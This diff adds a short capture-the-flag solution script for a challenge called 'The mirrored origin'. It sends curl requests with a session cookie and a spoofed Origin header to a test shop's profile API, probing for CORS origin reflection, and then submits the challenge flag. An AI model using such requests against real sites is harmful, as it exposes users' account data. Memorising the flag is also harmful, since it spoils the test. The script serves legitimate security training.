@@ -1,0 +1,5 @@
+# Challenge "The mirrored origin": the shortest path, replayed by CI in every language.
+curl -i -b "session=pg-client-2031" https://boutique.polygone.test/api/profil
+curl -i -b "session=pg-client-2031" -H "Origin: https://audit-lignerouge.example" https://boutique.polygone.test/api/profil
+submit FLAG{polygone-origine-miroir-7a2c}
+answer list
